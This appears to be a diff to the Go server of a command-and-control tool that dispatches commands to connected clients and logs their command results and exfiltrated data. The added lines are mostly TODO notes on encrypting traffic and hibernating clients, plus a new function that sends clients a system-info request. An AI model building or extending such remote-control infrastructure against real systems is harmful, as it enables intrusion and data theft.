@@ -22,6 +22,8 @@ Duties:
 - Update LastSeen timestamp
 - Remove client and cleanup on disconnect
 */
+
+// TODO: this handles incoming data from client
 func handleClientConnection(client *models.Client) {
 	defer func() {
 		client.Conn.Close()
@@ -33,6 +35,12 @@ func handleClientConnection(client *models.Client) {
 
 	for {
 		// Prevent dead clients from hanging forever.
+		/*
+			TODO: add my own custom code on how i want to handle timeouts.
+			heartbeat messages should prevent deadline from ever being reached?
+			Or if deadline is reached, send a "sleep/hibernate" message to the client that
+			also tells it when to wakeup?
+		*/
 		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 
 		n, err := client.Conn.Read(buffer)
@@ -72,6 +80,7 @@ This function:
 
 Returns InternalMessage or error.
 */
+// TODO: this is where message should be decrypted, decoded, deserialized
 func parseBinaryMessage(data []byte) (*models.InternalMessage, error) {
 	if len(data) < 12 {
 		return nil, fmt.Errorf("message too short")
@@ -136,6 +145,12 @@ func processClientMessage(client *models.Client, msg *models.InternalMessage) {
 		clientMessage.Type = "COMMAND_RESULT"
 		log.Printf("Command result from client %s (ID: %d):\n%s",
 			client.ID, msg.Header.MessageID, string(msg.Data))
+	/* TODO: add a specific one of these for stuff like systeminfo?
+	case models.MESSAGE_COMMAND_RESULT:
+		clientMessage.Type = "COMMAND_RESULT"
+		log.Printf("Command result from client %s (ID: %d):\n%s",
+			client.ID, msg.Header.MessageID, string(msg.Data))
+	*/
 
 	case models.MESSAGE_DATA_EXFIL:
 		clientMessage.Type = "DATA_EXFIL"
@@ -151,6 +166,8 @@ func processClientMessage(client *models.Client, msg *models.InternalMessage) {
 		clientMessage.Type = "ERROR_REPORT"
 		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
 	}
+
+	// TODO: maybe only add messages to the buffer if they are a certain msg.Header.MessageType?
 
 	// Append to client's message history (max 100)
 	clientsMutex.Lock()
@@ -169,6 +186,8 @@ This is the ONLY function that performs the actual network write.
 */
 func sendBinaryMessage(client *models.Client, msg models.InternalMessage) error {
 	data := serializeBinaryMessage(msg)
+	// data := encodeBinaryMessage(msg)
+	// data := encryptBinaryMessage(msg)
 	_, err := client.Conn.Write(data)
 	return err
 }
@@ -244,6 +263,31 @@ func SendCommandToClient(clientAddr string, command string) error {
 	}
 
 	log.Printf("Sent EXECUTE_COMMAND to client %s: %s", clientAddr, command)
+	return nil
+}
+
+// TODO:
+func SendMyCommandToClient(clientAddr string, command string) error {
+	client, exists := GetClient(clientAddr)
+	if !exists {
+		return fmt.Errorf("client not connected")
+	}
+
+	msg := models.InternalMessage{
+		Header: models.MessageHeader{
+			//MessageType: models.MESSAGE_EXECUTE_COMMAND, // TODO: figure out a a way to not hard code this
+			MessageType: models.MESSAGE_SYS_INFO, // TODO: hardcode for now
+			MessageID:   utils.GenerateMessageID(),
+			DataSize:    uint32(len(command)), // TODO: this doesn't matter for now but in the future maybe this can specify what system info we want (if not populated just give default)
+		},
+		Data: []byte(command),
+	}
+
+	if err := sendBinaryMessage(client, msg); err != nil {
+		return err
+	}
+
+	log.Printf("Sent MY_EXECUTE_COMMAND to client %s: %s", clientAddr, command)
 	return nil
 }
 
